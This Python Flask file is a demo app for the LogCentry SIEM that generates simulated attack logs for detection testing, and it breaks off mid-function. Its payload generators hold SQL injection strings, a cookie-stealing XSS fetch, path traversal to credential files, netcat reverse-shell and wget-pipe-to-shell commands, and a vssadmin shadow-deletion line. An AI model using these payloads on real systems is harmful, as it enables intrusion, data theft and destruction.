#!/usr/bin/env python3
"""
LogCentry Demo - Vulnerable Web Application

This is a DEMO vulnerable web app that:
1. Simulates common security vulnerabilities
2. Sends all logs to LogCentry via SDK
3. Allows you to trigger various attack patterns
4. Showcases ALL LogCentry features (SIEM, AI Analysis, UEBA, etc.)

⚠️  FOR DEMONSTRATION PURPOSES ONLY - DO NOT USE IN PRODUCTION
"""

import os
import sys
import random
import time
import string
import hashlib
from datetime import datetime, timedelta
from typing import Callable

# Add the src directory to path for local development
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from flask import Flask, request, jsonify, render_template_string
from logcentry.sdk.client import LogCentry

# Initialize Flask app
app = Flask(__name__)

# Initialize LogCentry SDK
LOGCENTRY_ENDPOINT = os.getenv("LOGCENTRY_ENDPOINT", "http://localhost:8000")
logger = LogCentry(
    api_key="lc_demo_vulnerable_app",
    endpoint=LOGCENTRY_ENDPOINT,
    batch_size=5,
    flush_interval=2.0,
)


# ==================== Dynamic Data Generators ====================

class DynamicDataGenerator:
    """Generate realistic, dynamic data for demo logs."""
    
    # Dynamic IP pools (generated, not hardcoded)
    @staticmethod
    def random_ip() -> str:
        """Generate a random IP address."""
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    @staticmethod
    def internal_ip() -> str:
        """Generate a random internal IP."""
        prefixes = ["10.0.0", "192.168.1", "172.16.5", "10.10.10"]
        return f"{random.choice(prefixes)}.{random.randint(1, 254)}"
    
    # Dynamic usernames
    @staticmethod
    def random_username() -> str:
        """Generate a random username."""
        prefixes = ["user", "admin", "dev", "test", "guest", "service", "backup", "root"]
        suffixes = ["", str(random.randint(1, 99)), "_" + random.choice(["prod", "dev", "test"])]
        return random.choice(prefixes) + random.choice(suffixes)
    
    @staticmethod
    def random_email() -> str:
        """Generate a random email."""
        domains = ["company.com", "internal.net", "corp.local", "example.org"]
        return f"{DynamicDataGenerator.random_username()}@{random.choice(domains)}"
    
    # Dynamic attack payloads
    @staticmethod
    def sqli_payload() -> str:
        """Generate a random SQL injection payload."""
        payloads = [
            f"' OR {random.randint(1, 9)}={random.randint(1, 9)}--",
            f"1; DROP TABLE {random.choice(['users', 'accounts', 'sessions', 'logs'])}--",
            f"1 UNION SELECT {','.join(['*'] * random.randint(1, 5))} FROM {random.choice(['users', 'credentials', 'admin'])}--",
            f"' AND SLEEP({random.randint(3, 10)})--",
            f"1'; EXEC xp_cmdshell('whoami')--",
            f"' OR '{''.join(random.choices(string.ascii_lowercase, k=3))}'='{''.join(random.choices(string.ascii_lowercase, k=3))}'",
        ]
        return random.choice(payloads)
    
    @staticmethod
    def xss_payload() -> str:
        """Generate a random XSS payload."""
        payloads = [
            f"<script>alert('{random.randint(1, 999)}')</script>",
            f"<img src=x onerror='alert({random.randint(1, 999)})'>",
            f"<svg onload='fetch(\"http://{DynamicDataGenerator.random_ip()}/steal?c=\"+document.cookie)'>",
            f"javascript:eval(atob('{hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}'))",
            f"<iframe src='javascript:alert({random.randint(1, 999)})'></iframe>",
        ]
        return random.choice(payloads)
    
    @staticmethod
    def path_traversal_payload() -> str:
        """Generate a random path traversal payload."""
        targets = ["etc/passwd", "etc/shadow", "var/log/auth.log", "root/.ssh/id_rsa", "windows/system32/config/sam"]
        traversals = ["../" * random.randint(3, 8), "....//....//", "..%2f" * random.randint(3, 6)]
        return random.choice(traversals) + random.choice(targets)
    
    @staticmethod
    def rce_payload() -> str:
        """Generate a random RCE payload."""
        commands = [
            f"; cat /etc/passwd",
            f"| nc {DynamicDataGenerator.random_ip()} {random.randint(4000, 9999)} -e /bin/sh",
            f"; wget http://{DynamicDataGenerator.random_ip()}/malware.sh | sh",
            f"$(curl http://{DynamicDataGenerator.random_ip()}/backdoor)",
            f"; powershell -enc {hashlib.md5(str(random.random()).encode()).hexdigest()}",
            f"`whoami && id`",
        ]
        return random.choice(commands)
    
    # Dynamic user agents
    @staticmethod
    def attack_user_agent() -> str:
        """Generate a random attack tool user agent."""
        tools = [
            f"sqlmap/{random.randint(1, 2)}.{random.randint(0, 9)}.{random.randint(0, 12)}",
            f"nikto/{random.randint(1, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
            f"gobuster/{random.randint(1, 4)}.{random.randint(0, 9)}",
            f"dirbuster/{random.randint(1, 2)}.{random.randint(0, 5)}",
            f"nmap/{random.randint(7, 8)}.{random.randint(0, 99)}",
            f"Hydra/{random.randint(8, 10)}.{random.randint(0, 9)}",
            "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
            f"python-requests/{random.randint(2, 3)}.{random.randint(0, 31)}.{random.randint(0, 9)}",
        ]
        return random.choice(tools)
    
    @staticmethod
    def normal_user_agent() -> str:
        """Generate a random normal browser user agent."""
        browsers = [
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{random.randint(90, 121)}.0.0.0",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 Safari/{random.randint(600, 617)}.1",
            f"Mozilla/5.0 (X11; Linux x86_64; rv:{random.randint(90, 120)}.0) Gecko/20100101 Firefox/{random.randint(90, 120)}.0",
        ]
        return random.choice(browsers)
    
    # Dynamic file names
    @staticmethod
    def sensitive_file() -> str:
        """Generate a random sensitive file name."""
        files = [
            f"confidential_{random.randint(2020, 2026)}_{random.choice(['q1', 'q2', 'q3', 'q4'])}.pdf",
            f"employee_data_{random.randint(1, 999)}.xlsx",
            f"financial_report_{random.randint(2020, 2026)}.docx",
            f"database_backup_{datetime.now().strftime('%Y%m%d')}.sql",
            f"ssh_keys_{DynamicDataGenerator.random_username()}.tar.gz",
            f"credentials_{random.choice(['prod', 'staging', 'dev'])}.json",
        ]
        return random.choice(files)
    
    @staticmethod
    def random_password() -> str:
        """Generate a random weak password for brute force simulation."""
        weak = [
            f"password{random.randint(1, 999)}",
            f"123456{random.randint(0, 9)}",
            f"admin{random.randint(1, 99)}",
            f"qwerty{random.choice(['!', '@', '#', ''])}",
            f"{random.choice(['summer', 'winter', 'spring', 'fall'])}{random.randint(2020, 2026)}",
            f"pass{random.randint(100, 9999)}",
        ]
        return random.choice(weak)


gen = DynamicDataGenerator()


# Simulated user database
USERS = {
    "admin": "admin123",
    "user1": "password1",
    "developer": "dev@123",
}


# ==================== Dashboard HTML ====================

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>VulnApp - LogCentry Demo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            color: #fff;
            min-height: 100vh;
            padding: 1.5rem;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 { 
            text-align: center; 
            margin-bottom: 1.5rem;
            background: linear-gradient(90deg, #ff6b6b, #ffd93d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2rem;
        }
        .warning {
            background: rgba(255, 107, 107, 0.2);
            border: 1px solid #ff6b6b;
            padding: 0.75rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            text-align: center;
            font-size: 0.9rem;
        }
        .section {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 1.25rem;
            margin-bottom: 1.25rem;
        }
        h2 { color: #ffd93d; margin-bottom: 0.75rem; font-size: 1.1rem; }
        h3 { color: #72d999; margin: 0.75rem 0 0.5rem 0; font-size: 1rem; }
        .btn {
            display: inline-block;
            padding: 0.6rem 1rem;
            background: linear-gradient(90deg, #ff6b6b, #ee5a24);
            border: none;
            border-radius: 8px;
            color: #fff;
            cursor: pointer;
            margin: 0.2rem;
            text-decoration: none;
            font-size: 0.85rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn:hover { transform: scale(1.03); box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3); }
        .btn-safe { background: linear-gradient(90deg, #00d4ff, #0984e3); }
        .btn-purple { background: linear-gradient(90deg, #b794f4, #805ad5); }
        .btn-green { background: linear-gradient(90deg, #72d999, #38a169); }
        .btn-large { padding: 1rem 2rem; font-size: 1rem; display: block; width: 100%; text-align: center; margin: 0.5rem 0; }
        input, textarea {
            width: 100%;
            padding: 0.6rem;
            margin: 0.4rem 0;
            background: rgba(255,255,255,0.1);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 8px;
            color: #fff;
            font-size: 0.9rem;
        }
        .log { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: #0f0; }
        #output {
            background: #000;
            padding: 1rem;
            border-radius: 8px;
            min-height: 120px;
            max-height: 250px;
            overflow-y: auto;
        }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; }
        .feature-badge {
            display: inline-block;
            padding: 0.2rem 0.5rem;
            background: rgba(183, 148, 244, 0.2);
            border-radius: 4px;
            font-size: 0.7rem;
            margin-left: 0.5rem;
            color: #b794f4;
        }
        .btn-row { display: flex; flex-wrap: wrap; gap: 0.25rem; }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            gap: 0.5rem; 
            margin-top: 0.5rem;
            font-size: 0.8rem;
        }
        .stat-item { 
            background: rgba(0,0,0,0.3); 
            padding: 0.5rem; 
            border-radius: 6px; 
            text-align: center; 
        }
        .stat-value { font-size: 1.2rem; font-weight: bold; color: #ffd93d; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 VulnApp - LogCentry Demo</h1>
        
        <div class="warning">
            ⚠️ Vulnerable demo app. All logs sent to LogCentry with <strong>dynamic, realistic data</strong>.
        </div>
        
        <!-- Full Demo Section -->
        <div class="section">
            <h2>🎬 Full Demo Showcase <span class="feature-badge">RECOMMENDED</span></h2>
            <p style="font-size: 0.85rem; margin-bottom: 0.75rem; color: #9aa0a6;">
                Run a complete demo that showcases ALL LogCentry features with dynamic data.
            </p>
            <button class="btn btn-purple btn-large" onclick="runComprehensiveDemo()">
                🚀 Run Comprehensive Demo (All Features)
            </button>
            <div class="stats" id="demoStats" style="display: none;">
                <div class="stat-item"><div class="stat-value" id="statLogs">0</div>Logs Generated</div>
                <div class="stat-item"><div class="stat-value" id="statAlerts">0</div>Alerts Created</div>
                <div class="stat-item"><div class="stat-value" id="statSeverity">-</div>Threat Level</div>
                <div class="stat-item"><div class="stat-value" id="statAttacks">0</div>Attack Types</div>
            </div>
        </div>
        
        <div class="grid">
            <!-- Attack Simulations -->
            <div class="section">
                <h2>🎯 Attack Simulations <span class="feature-badge">SIEM</span></h2>
                <h3>Authentication Attacks</h3>
                <div class="btn-row">
                    <button class="btn" onclick="simulateBruteForce()">Brute Force</button>
                    <button class="btn" onclick="simulateCredentialStuffing()">Credential Stuffing</button>
                </div>
                <h3>Injection Attacks</h3>
                <div class="btn-row">
                    <button class="btn" onclick="simulateSQLi()">SQL Injection</button>
                    <button class="btn" onclick="simulateXSS()">XSS Attack</button>
                    <button class="btn" onclick="simulateRCE()">RCE Attack</button>
                </div>
                <h3>Threat Chains</h3>
                <div class="btn-row">
                    <button class="btn" onclick="simulateLateralMovement()">Lateral Movement</button>
                    <button class="btn" onclick="simulateExfiltration()">Data Exfiltration</button>
                    <button class="btn" onclick="simulateRansomware()">Ransomware</button>
                </div>
            </div>
            
            <!-- SIEM Features -->
            <div class="section">
                <h2>🛡️ SIEM & Correlation <span class="feature-badge">CORE</span></h2>
                <div class="btn-row">
                    <button class="btn btn-purple" onclick="triggerCorrelation()">Run Correlation</button>
                    <button class="btn btn-purple" onclick="createAlerts()">Create Alerts</button>
                    <button class="btn btn-purple" onclick="getSIEMStats()">Get Stats</button>
                </div>
                <h3>Detection Rules</h3>
                <div class="btn-row">
                    <button class="btn" onclick="evaluateRules()">Evaluate Rules</button>
                    <button class="btn" onclick="listRules()">List Rules</button>
                </div>
            </div>
            
            <!-- AI Analysis -->
            <div class="section">
                <h2>🤖 AI Analysis <span class="feature-badge">AI</span></h2>
                <div class="btn-row">
                    <button class="btn btn-green" onclick="triggerAnalysis(50)">Analyze (50 logs)</button>
                    <button class="btn btn-green" onclick="triggerAnalysis(100)">Analyze (100 logs)</button>
                </div>
            </div>
            
            <!-- Normal Traffic -->
            <div class="section">
                <h2>✅ Normal Traffic</h2>
                <div class="btn-row">
                    <button class="btn btn-safe" onclick="generateNormalTraffic()">Generate Normal Logs</button>
                    <button class="btn btn-safe" onclick="simulateUserSession()">User Session</button>
                </div>
            </div>
        </div>
        
        <!-- Output -->
        <div class="section">
            <h2>📋 Live Output</h2>
            <div id="output"><span class="log">Ready to run demo...</span></div>
        </div>
        
        <!-- Links -->
        <div class="section" style="text-align: center;">
            <a href="http://localhost:8000/dashboard" target="_blank" class="btn btn-safe">
                📊 Open LogCentry Dashboard
            </a>
            <a href="http://localhost:8000/api/docs" target="_blank" class="btn">
                📖 API Docs
            </a>
        </div>
    </div>
    
    <script>
        const API = '';
        const LOGCENTRY = 'http://localhost:8000';
        
        function log(msg, type = 'info') {
            const output = document.getElementById('output');
            const time = new Date().toLocaleTimeString();
            const colors = { info: '#0f0', warn: '#ffd93d', error: '#ff6b6b', success: '#72d999' };
            output.innerHTML += `<div class="log" style="color: ${colors[type] || '#0f0'}">[${time}] ${msg}</div>`;
            output.scrollTop = output.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('output').innerHTML = '';
        }
        
        function updateStats(logs, alerts, severity, attacks) {
            document.getElementById('demoStats').style.display = 'grid';
            document.getElementById('statLogs').textContent = logs;
            document.getElementById('statAlerts').textContent = alerts;
            document.getElementById('statSeverity').textContent = severity;
            document.getElementById('statAttacks').textContent = attacks;
        }
        
        async function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
        
        // ==================== Comprehensive Demo ====================
        
        async function runComprehensiveDemo() {
            clearLog();
            log('🚀 STARTING COMPREHENSIVE LOGCENTRY DEMO', 'success');
            log('━'.repeat(50));
            
            let totalLogs = 0;
            let totalAlerts = 0;
            let attackTypes = 0;
            
            // Phase 1: Normal traffic baseline
            log('\\n📊 Phase 1: Generating baseline normal traffic...', 'info');
            const normal = await fetch('/api/demo/normal-traffic?count=15').then(r => r.json());
            totalLogs += normal.logs_generated || 0;
            log(`   Generated ${normal.logs_generated} normal activity logs`, 'success');
            await sleep(1000);
            
            // Phase 2: Authentication attacks
            log('\\n🔐 Phase 2: Simulating authentication attacks...', 'warn');
            const brute = await fetch('/api/demo/brute-force?attempts=12').then(r => r.json());
            totalLogs += brute.logs_generated || 0;
            attackTypes++;
            log(`   Brute force: ${brute.logs_generated} attempts from ${brute.source_ip}`, 'warn');
            await sleep(500);
            
            const cred = await fetch('/api/demo/credential-stuffing?attempts=8').then(r => r.json());
            totalLogs += cred.logs_generated || 0;
            attackTypes++;
            log(`   Credential stuffing: ${cred.logs_generated} attempts`, 'warn');
            await sleep(1000);
            
            // Phase 3: Injection attacks
            log('\\n💉 Phase 3: Simulating injection attacks...', 'warn');
            const sqli = await fetch('/api/demo/sqli-attack?count=8').then(r => r.json());
            totalLogs += sqli.logs_generated || 0;
            attackTypes++;
            log(`   SQL Injection: ${sqli.logs_generated} payloads tested`, 'warn');
            await sleep(500);
            
            const xss = await fetch('/api/demo/xss-attack?count=5').then(r => r.json());
            totalLogs += xss.logs_generated || 0;
            attackTypes++;
            log(`   XSS: ${xss.logs_generated} attempts`, 'warn');
            await sleep(1000);
            
            // Phase 4: Threat chain
            log('\\n🔗 Phase 4: Simulating attack chain...', 'error');
            const lateral = await fetch('/api/demo/lateral-movement').then(r => r.json());
            totalLogs += lateral.logs_generated || 0;
            attackTypes++;
            log(`   Lateral movement: ${lateral.ips_compromised} IPs accessed`, 'error');
            await sleep(500);
            
            const exfil = await fetch('/api/demo/exfiltration?files=10').then(r => r.json());
            totalLogs += exfil.logs_generated || 0;
            attackTypes++;
            log(`   Data exfiltration: ${exfil.files_accessed} files (${exfil.bytes_exfiltrated} bytes)`, 'error');
            await sleep(1500);
            
            // Phase 5: Run SIEM correlation
            log('\\n🛡️ Phase 5: Running SIEM correlation...', 'info');
            const corr = await fetch(`${LOGCENTRY}/api/v1/siem/alerts/from-correlation?log_count=100`, {
                method: 'POST',
                headers: {'X-API-Key': 'lc_demo_test'}
            }).then(r => r.json());
            totalAlerts = corr.alerts_created || 0;
            log(`   Created ${corr.alerts_created} alerts from ${corr.correlations_found} correlations`, 'success');
            await sleep(1000);
            
            // Phase 6: AI Analysis
            log('\\n🤖 Phase 6: Running AI threat analysis...', 'info');
            const analysis = await fetch(`${LOGCENTRY}/api/v1/analyze`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json', 'X-API-Key': 'lc_demo_test'},
                body: JSON.stringify({count: 100, use_rag: false})
            }).then(r => r.json());
            
            const severity = `${analysis.severity}/10`;
            log(`   Severity: ${analysis.severity}/10 (${analysis.severity_label})`, 
                analysis.severity >= 7 ? 'error' : analysis.severity >= 4 ? 'warn' : 'info');
            log(`   MITRE TTPs: ${analysis.mitre_techniques?.join(', ') || 'None'}`, 'info');
            log(`   Countermeasures: ${analysis.countermeasures?.length || 0} recommended`, 'info');
            await sleep(500);
            
            // Summary
            log('\\n' + '━'.repeat(50));
            log('✅ DEMO COMPLETE!', 'success');
            log(`   📊 Total Logs: ${totalLogs}`, 'success');
            log(`   🚨 Alerts Created: ${totalAlerts}`, 'success');
            log(`   ⚠️ Threat Level: ${severity}`, 'success');
            log(`   🎯 Attack Types: ${attackTypes}`, 'success');
            log('\\n👉 Check the LogCentry Dashboard to see results!', 'info');
            
            updateStats(totalLogs, totalAlerts, severity, attackTypes);
        }
        
        // ==================== Individual Attack Simulations ====================
        
        async function simulateBruteForce() {
            log('🔐 Simulating brute force attack...', 'warn');
            const res = await fetch('/api/demo/brute-force?attempts=15').then(r => r.json());
            log(`   Generated ${res.logs_generated} attempts from ${res.source_ip}`, 'success');
        }
        
        async function simulateCredentialStuffing() {
            log('🔐 Simulating credential stuffing...', 'warn');
            const res = await fetch('/api/demo/credential-stuffing?attempts=10').then(r => r.json());
            log(`   Generated ${res.logs_generated} attempts with ${res.unique_users} users`, 'success');
        }
        
        async function simulateSQLi() {
            log('💉 Simulating SQL injection attack...', 'warn');
            const res = await fetch('/api/demo/sqli-attack?count=10').then(r => r.json());
            log(`   Generated ${res.logs_generated} SQLi attempts`, 'success');
        }
        
        async function simulateXSS() {
            log('💉 Simulating XSS attack...', 'warn');
            const res = await fetch('/api/demo/xss-attack?count=8').then(r => r.json());
            log(`   Generated ${res.logs_generated} XSS attempts`, 'success');
        }
        
        async function simulateRCE() {
            log('💉 Simulating RCE attack...', 'warn');
            const res = await fetch('/api/demo/rce-attack?count=6').then(r => r.json());
            log(`   Generated ${res.logs_generated} RCE attempts`, 'success');
        }
        
        async function simulateLateralMovement() {
            log('🔗 Simulating lateral movement...', 'error');
            const res = await fetch('/api/demo/lateral-movement').then(r => r.json());
            log(`   Moved through ${res.ips_compromised} hosts`, 'success');
        }
        
        async function simulateExfiltration() {
            log('📤 Simulating data exfiltration...', 'error');
            const res = await fetch('/api/demo/exfiltration?files=15').then(r => r.json());
            log(`   Exfiltrated ${res.files_accessed} files (${res.bytes_exfiltrated} bytes)`, 'success');
        }
        
        async function simulateRansomware() {
            log('🦠 Simulating ransomware behavior...', 'error');
            const res = await fetch('/api/demo/ransomware').then(r => r.json());
            log(`   Encrypted ${res.files_encrypted} files`, 'success');
        }
        
        // ==================== SIEM Features ====================
        
        async function triggerCorrelation() {
            log('🛡️ Running event correlation...', 'info');
            const res = await fetch(`${LOGCENTRY}/api/v1/siem/correlate`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json', 'X-API-Key': 'lc_demo_test'},
                body: JSON.stringify({log_count: 100})
            }).then(r => r.json());
            log(`   Found ${res.total} correlations`, 'success');
        }
        
        async function createAlerts() {
            log('🚨 Creating alerts from correlations...', 'info');
            const res = await fetch(`${LOGCENTRY}/api/v1/siem/alerts/from-correlation?log_count=100`, {
                method: 'POST',
                headers: {'X-API-Key': 'lc_demo_test'}
            }).then(r => r.json());
            log(`   Created ${res.alerts_created} alerts`, 'success');
        }
        
        async function getSIEMStats() {
            log('📊 Fetching SIEM stats...', 'info');
            const res = await fetch(`${LOGCENTRY}/api/v1/siem/stats`, {
                headers: {'X-API-Key': 'lc_demo_test'}
            }).then(r => r.json());
            log(`   Alerts: ${res.alerts?.total || 0} (${res.alerts?.active || 0} active)`, 'success');
            log(`   Rules: ${res.rules?.total || 0} (${res.rules?.builtin || 0} built-in)`, 'info');
        }
        
        async function evaluateRules() {
            log('📋 Evaluating detection rules...', 'info');
            const res = await fetch(`${LOGCENTRY}/api/v1/siem/rules/evaluate?log_count=100`, {
                method: 'POST',
                headers: {'X-API-Key': 'lc_demo_test'}
            }).then(r => r.json());
            const triggered = res.matches?.filter(m => m.triggered) || [];
            log(`   Evaluated ${res.rules_evaluated} rules, ${triggered.length} triggered`, 'success');
        }
        
        async function listRules() {
            log('📋 Listing detection rules...', 'info');
            const res = await fetch(`${LOGCENTRY}/api/v1/siem/rules`, {
                headers: {'X-API-Key': 'lc_demo_test'}
            }).then(r => r.json());
            log(`   ${res.total} rules (${res.builtin_count} built-in)`, 'success');
        }
        
        // ==================== AI Analysis ====================
        
        async function triggerAnalysis(count) {
            log(`🤖 Running AI analysis on ${count} logs...`, 'info');
            const res = await fetch(`${LOGCENTRY}/api/v1/analyze`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json', 'X-API-Key': 'lc_demo_test'},
                body: JSON.stringify({count: count, use_rag: false})
            }).then(r => r.json());
            log(`   Severity: ${res.severity}/10 (${res.severity_label})`, 
                res.severity >= 7 ? 'error' : res.severity >= 4 ? 'warn' : 'success');
            if (res.mitre_techniques?.length) {
                log(`   MITRE: ${res.mitre_techniques.join(', ')}`, 'info');
            }
            if (res.countermeasures?.length) {
                log(`   ${res.countermeasures.length} countermeasures recommended`, 'info');
            }
        }
        
        // ==================== Normal Traffic ====================
        
        async function generateNormalTraffic() {
            log('✅ Generating normal traffic...', 'info');
            const res = await fetch('/api/demo/normal-traffic?count=20').then(r => r.json());
            log(`   Generated ${res.logs_generated} normal logs`, 'success');
        }
        
        async function simulateUserSession() {
            log('👤 Simulating user session...', 'info');
            const res = await fetch('/api/demo/user-session').then(r => r.json());
            log(`   Session: ${res.actions} actions by ${res.user}`, 'success');
        }
    </script>
</body>
</html>
"""


# ==================== API Routes ====================

@app.route("/")
def index():
    """Serve the demo dashboard."""
    logger.info("Dashboard accessed", source="web", path="/", ip=request.remote_addr)
    return render_template_string(DASHBOARD_HTML)


@app.route("/api/health")
def health():
    """Health check endpoint."""
    logger.debug("Health check", source="api")
    return jsonify({"status": "ok", "app": "vulnapp-demo"})


# ==================== Demo Endpoints with Dynamic Data ====================

@app.route("/api/demo/normal-traffic")
def demo_normal_traffic():
    """Generate normal traffic logs with dynamic data."""
    count = min(int(request.args.get("count", 10)), 50)
    
    for _ in range(count):
        action = random.choice(["login", "view", "search", "update", "logout"])
        user = gen.random_username()
        ip = gen.internal_ip()
        
        if action == "login":
            logger.info(f"User '{user}' logged in successfully", source="auth", ip=ip, user=user, status="success")
        elif action == "view":
            page = random.choice(["/dashboard", "/profile", "/settings", "/reports", "/analytics"])
            logger.info(f"Page view: {page}", source="web", ip=ip, user=user, path=page)
        elif action == "search":
            query = random.choice(["sales report", "user data", "analytics", "logs", "transactions"])
            logger.info(f"Search query: '{query}'", source="api", ip=ip, user=user, query=query)
        elif action == "update":
            resource = random.choice(["profile", "settings", "preferences", "notifications"])
            logger.info(f"Updated {resource}", source="api", ip=ip, user=user, action="update", resource=resource)
        else:
            logger.info(f"User '{user}' logged out", source="auth", ip=ip, user=user, status="logout")
        
        time.sleep(0.05)
    
    logger.flush()
    return jsonify({"status": "ok", "logs_generated": count})


@app.route("/api/demo/brute-force")
def demo_brute_force():
    """Simulate brute force attack with dynamic data."""
    attempts = min(int(request.args.get("attempts", 10)), 30)
    source_ip = gen.random_ip()
    target_user = random.choice(["admin", "root", "administrator", gen.random_username()])
    
    for i in range(attempts):
        password = gen.random_password()
        logger.warning(
            f"Failed login attempt for user '{target_user}'",
            source="auth",
            ip=source_ip,
            user=target_user,
            password_hash=hashlib.md5(password.encode()).hexdigest()[:8],
            attempt_number=i + 1,
            status="failed",
            reason="invalid_password",
            attack_type="brute_force",
        )
        time.sleep(0.05)
    
    logger.flush()
    return jsonify({
        "status": "ok",
        "logs_generated": attempts,
        "source_ip": source_ip,
        "target_user": target_user
    })


@app.route("/api/demo/credential-stuffing")
def demo_credential_stuffing():
    """Simulate credential stuffing attack with dynamic data."""
    attempts = min(int(request.args.get("attempts", 10)), 30)
    source_ip = gen.random_ip()
    users_tried = set()
    
    for i in range(attempts):
        user = gen.random_email()
        users_tried.add(user)
        password = gen.random_password()
        
        logger.security(
            f"Credential stuffing attempt for '{user}'",
            source="auth",
            ip=source_ip,
            user=user,
            status="failed",
            attack_type="credential_stuffing",
            user_agent=gen.attack_user_agent(),
        )
        time.sleep(0.03)
    
    logger.flush()
    return jsonify({
        "status": "ok",
        "logs_generated": attempts,
        "unique_users": len(users_tried),
        "source_ip": source_ip
    })


@app.route("/api/demo/sqli-attack")
def demo_sqli_attack():
    """Simulate SQL injection attack with dynamic payloads."""
    count = min(int(request.args.get("count", 10)), 20)
    source_ip = gen.random_ip()
    
    for _ in range(count):
        payload = gen.sqli_payload()
        endpoint = random.choice(["/api/users", "/api/search", "/api/products", "/api/orders"])
        
        logger.security(
            f"SQL Injection attempt: {payload[:80]}",
            source="api",
            ip=source_ip,
            path=endpoint,
            payload=payload,
            attack_type="sqli",
            user_agent=gen.attack_user_agent(),
        )
        time.sleep(0.05)
    
    logger.flush()
    return jsonify({"status": "ok", "logs_generated": count, "source_ip": source_ip})


@app.route("/api/demo/xss-attack")
def demo_xss_attack():
    """Simulate XSS attack with dynamic payloads."""
    count = min(int(request.args.get("count", 8)), 15)
    source_ip = gen.random_ip()
    
    for _ in range(count):
        payload = gen.xss_payload()
        field = random.choice(["comment", "username", "search", "title", "message"])
        
        logger.security(
            f"XSS attempt in '{field}' field",
            source="web",
            ip=source_ip,
            field=field,
            payload=payload[:100],
            attack_type="xss",
            user_agent=gen.attack_user_agent(),
        )
        time.sleep(0.05)
    
    logger.flush()
    return jsonify({"status": "ok", "logs_generated": count, "source_ip": source_ip})


@app.route("/api/demo/rce-attack")
def demo_rce_attack():
    """Simulate RCE attack with dynamic payloads."""
    count = min(int(request.args.get("count", 6)), 15)
    source_ip = gen.random_ip()
    
    for _ in range(count):
        payload = gen.rce_payload()
        endpoint = random.choice(["/api/exec", "/api/upload", "/api/convert", "/api/process"])
        
        logger.security(
            f"RCE attempt detected",
            source="api",
            ip=source_ip,
            path=endpoint,
            payload=payload,
            attack_type="rce",
            user_agent=gen.attack_user_agent(),
        )
        time.sleep(0.05)
    
    logger.flush()
    return jsonify({"status": "ok", "logs_generated": count, "source_ip": source_ip})


@app.route("/api/demo/lateral-movement")
def demo_lateral_movement():
    """Simulate lateral movement with dynamic IPs."""
    attacker = gen.random_username()
    ips = [gen.internal_ip() for _ in range(random.randint(3, 6))]
    logs_generated = 0
    
    for i, ip in enumerate(ips):
        # Login from new IP
        logger.info(
            f"Successful login for user '{attacker}'",
            source="auth",
            ip=ip,
            user=attacker,
            status="success",
            hop_number=i + 1,
        )
        logs_generated += 1
        time.sleep(0.1)
        
        # Access sensitive resources
        resource = random.choice(["/api/admin/config", "/api/admin/secrets", "/api/admin/users", "/api/internal/keys"])
        logger.security(
            f"Sensitive resource access from {ip}",
            source="api",
            ip=ip,
            user=attacker,
            path=resource,
            attack_type="lateral_movement",
        )
        logs_generated += 1
        time.sleep(0.1)
    
    logger.flush()
    return jsonify({
        "status": "ok",
        "message": "Lateral movement simulated",
        "logs_generated": logs_generated,
        "ips_compromised": len(ips),
        "user": attacker
    })


@app.route("/api/demo/exfiltration")
def demo_exfiltration():
    """Simulate data exfiltration with dynamic file names."""
    file_count = min(int(request.args.get("files", 15)), 30)
    source_ip = gen.internal_ip()
    user = gen.random_username()
    total_bytes = 0
    
    for _ in range(file_count):
        filename = gen.sensitive_file()
        bytes_sent = random.randint(10000, 500000)
        total_bytes += bytes_sent
        
        logger.security(
            f"High-volume file download: {filename}",
            source="api",
            ip=source_ip,
            user=user,
            filename=filename,
            bytes_sent=bytes_sent,
            attack_type="exfiltration",
        )
        time.sleep(0.03)
    
    logger.flush()
    return jsonify({
        "status": "ok",
        "message": "Data exfiltration simulated",
        "logs_generated": file_count,
        "files_accessed": file_count,
        "bytes_exfiltrated": total_bytes,
        "user": user
    })


@app.route("/api/demo/ransomware")
def demo_ransomware():
    """Simulate ransomware behavior with dynamic file names."""
    source_ip = gen.internal_ip()
    user = random.choice(["SYSTEM", "backup_svc", "admin"])
    files = [gen.sensitive_file() for _ in range(random.randint(5, 10))]
    
    for filename in files:
        # File encryption
        logger.security(
            f"File encrypted: {filename}.encrypted",
            source="system",
            ip=source_ip,
            user=user,
            original_file=filename,
            action="encrypt",
            attack_type="ransomware",
        )
        time.sleep(0.05)
    
    # Shadow copy deletion
    logger.security(
        "Volume shadow copies deleted",
        source="system",
        ip=source_ip,
        user=user,
        command="vssadmin.exe Delete Shadows /All /Quiet",
        attack_type="rce",
    )
    
    # Ransom note
    logger.security(
        "Ransom note created: README_DECRYPT.txt",
        source="system",
        ip=source_ip,
        user=user,
        attack_type="ransomware",
    )
    
    logger.flush()
    return jsonify({
        "status": "ok",
        "message": "Ransomware behavior simulated",
        "logs_generated": len(files) + 2,
        "files_encrypted": len(files)
    })


@app.route("/api/demo/user-session")
def demo_user_session():
    """Simulate a complete user session with dynamic data."""
